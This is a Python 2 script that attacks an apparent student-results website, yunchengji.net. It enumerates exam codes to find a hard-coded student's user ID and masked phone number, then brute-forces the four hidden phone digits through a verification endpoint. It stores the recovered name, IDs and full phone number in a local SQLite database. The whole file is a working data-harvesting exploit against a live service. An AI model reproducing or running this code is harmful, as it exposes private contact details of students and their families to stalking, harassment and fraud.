#-*- coding: UTF-8 -*-
import urllib2 as ul
import socket
import re
import retry
import logging
import sqlite3 as sql
import sys
reload(sys)
sys.setdefaultencoding('utf8')
logging.basicConfig(level = logging.INFO,format = '%(asctime)s [%(levelname)s] %(message)s')
log = logging.getLogger()

@retry.retry(ul.URLError, tries=6, delay=3,logger=log)
def try_open(url):
    return ul.urlopen(url)

def fix_num(l,s):
    ans = ""
    ss = str(s)
    for i in range(l-len(ss)):
        ans=ans+"0"
    return ans+str(ss)


def find_id(txt):
    key = "id_userID\" value=\".+?\""
    pattern = re.compile(key)
    matcher = re.search(pattern,txt)
    text = matcher.group(0)
    res = str()
    for i in text:
        if(i.isdigit()):
            res=res+i

    return res

def find_part_pn(txt):
    key = "<input type=\"hidden\" id=\"id_tel\" value=\".+?\""
    pattern = re.compile(key)
    matcher = re.search(pattern,txt)
    text = matcher.group(0)
    res = str()
    for i in text:
        if(i.isdigit()):
            res=res+i

    return res

def get_id(sch,name):
    url_id = "https://www.yunchengji.net/register/search-student?type=-99&studentName="
    for cr in range(1, 22):
        for stid in range(1, 60):
            url_name = ul.quote(name)
            data = url_id + url_name+"&examCode="+sch+fix_num(2,cr) + fix_num(2,stid) + "&identity=parent"
            log.debug(data)
            rep = try_open(data)
            text = rep.read()
            log.debug(text)

            if text != "0":
                userid = find_id(text)
                part_num = find_part_pn(text)
                return userid,sch+fix_num(2,cr)+fix_num(2,stid),part_num

def get_pn(userid):
    url_phone = "https://www.yunchengji.net/register/completion-studen-phone?userID="
    for i in range(9999):
        data = url_phone + str(userid) + "&number="+fix_num(4,i)
        log.debug(data)
        rep = try_open(data)
        text = rep.read()
        log.debug(data)
        if(text!="false"):
            return fix_num(4,i)

def output(na,st,phone,us):
    log.info("Connect to database")
    conn = sql.connect("student.db")
    conn.text_factory = str
    cursor = conn.cursor()
    log.info("Creating table STU")
    comm=('''CREATE TABLE IF NOT EXISTS STU
    (
    name INT NOT NULL,
    stid INT PRIMARY KEY NOT NULL,
    pn INT NOT NULL,
    usid INT NOT NULL
    );''')
    cursor.execute(comm)
    para = (na,st,phone,us)
    log.info("Insert data to STU")
    comm = ('INSERT INTO STU (name,stid,pn,usid) VALUES (?,?,?,?);')
    cursor.execute(comm,para)
    cursor.close()
    log.info("Commiting .....")
    conn.commit()
    conn.close()
    log.info("Success!")

nam = "曹真"
sch_id = "80120"
log.info("Student Name = "+nam)
log.info("Getting ID .........")
userid,stuid,ptpn1 = get_id(sch_id,nam)
log.info("StudentID = "+str(stuid))
log.info("UserID = "+str(userid))
log.info("Getting phone number ......")
ptpn2 = get_pn(userid)
pn = ptpn1[0:3]+ptpn2+ptpn1[3:7]
log.info("Phone number = "+pn)
log.info("Success!(!!_!!)")
log.info("Output to database")
output(nam,stuid,pn,userid)